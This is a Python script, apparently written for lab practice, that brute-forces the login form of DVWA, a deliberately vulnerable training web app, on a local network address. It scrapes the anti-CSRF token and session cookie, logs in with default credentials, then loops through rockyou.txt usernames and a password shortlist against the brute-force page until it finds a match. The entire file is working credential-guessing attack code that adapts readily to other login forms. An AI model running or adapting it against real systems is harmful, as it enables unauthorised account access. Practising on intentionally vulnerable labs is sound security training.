import requests
from bs4 import BeautifulSoup
import sys
import re


# Variables
target = 'http://192.168.1.168/dvwa'
sec_level = 'low'
dvwa_user = 'admin'
dvwa_pass = 'password'
user_list = r'C:\Users\igor\Downloads\rockyou.txt'
pass_list = r'C:\Users\igor\Downloads\top_shortlist.txt'


# Value to look for in response header (Whitelisting)
success = 'Welcome to the password protected area'


#Connection
#url = 'http://192.168.1.168/dvwa/login.php'
#r = requests.Session()

#Add Content-type Header
#r.headers['Content-Type']="application/json"

#payload = {'username': 'admin', 'password': 'password'}

#resp = r.post(url,payload)

def csrf_token():
    try:
        # Make the request to the URL
        print ("\n[i] URL: {} /login.php" .format(target))
        r = requests.get("{0}/login.php".format(target), allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n[!] csrf_token: Failed to connect (URL: {} /login.php).\n[i] Quitting.".format(target))
        sys.exit(-1)


 # Extract anti-CSRF token
    soup = BeautifulSoup(r.text)
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print ("[i] user_token: {}" .format(user_token))

    # Extract session information DA VERIFICARE
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: {}" .format(session_id))

    return session_id, user_token


# Login to DVWA core
def dvwa_login(session_id, user_token):
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        print("\n[i] URL: {} /login.php".format(target))
        print("[i] Data: {} ".format(data))
        print("[i] Cookie: {} " .format(cookie))
        r = requests.post("{}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print("\n\n[!] dvwa_login: Failed to connect (URL: {} /login.php).\n[i] Quitting." .format(target))
        sys.exit(-1)

    # Wasn't it a redirect?
    if r.status_code != 301 and r.status_code != 302:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print("\n\n[!] dvwa_login: Page didn't response correctly (Response: {} s).\n[i] Quitting.".format(r.status_code))
        sys.exit(-1)

    # Did we log in successfully?
    if r.headers["Location"] != 'index.php':
        # Feedback for the user (there was an error) & Stop execution of our request
        print("\n\n[!] dvwa_login: Didn't login (Header: {} user: {}  password: {}  user_token: {}  session_id: %s).\n[i] Quitting." .format(
          r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id))
        sys.exit(-1)

    # If we got to here, everything should be okay!
    print("\n[i] Logged in! as {} {}" .format(dvwa_user, dvwa_pass))
    return True


# Make the request to-do the brute force
def url_request(username, password, session_id):
    # GET data
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        #print "\n[i] URL: %s/vulnerabilities/brute/" % target
        #print "[i] Data: %s" % data
        #print "[i] Cookie: %s" % cookie
        r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n\n[!] url_request: Failed to connect (URL: {}/vulnerabilities/brute/).\n[i] Quitting." .format(target))
        sys.exit(-1)

    # Was it a ok response?
    if r.status_code != 200:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print ("\n\n[!] url_request: Page didn't response correctly (Response: {}).\n[i] Quitting." .format(r.status_code))
        sys.exit(-1)

    # We have what we need
    return r.text



# Main brute force loop
def brute_force(session_id):
    # Load in wordlists files
    with open(pass_list) as password:
        password = password.readlines()
    with open(user_list, errors='ignore') as username:
        username = username.readlines()

    # Counter
    i = 0

    # Loop around
    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            # Increase counter
            i += 1

            # Feedback for the user
            print ("[i] Try {}: {} // {}"  .format(i, USER, PASS))

            # Make request
            attempt = url_request(USER, PASS, session_id)
            #print attempt

            # Check response
            if success in attempt:
                print ("\n\n[i] Found!")
                print("[i] Username: {}" .format(USER))
                print("[i] Password: {}" .format(PASS))
                return True
    return False






uno ,  due  =  csrf_token()
dvwa_login(uno, due)
brute_force(uno)
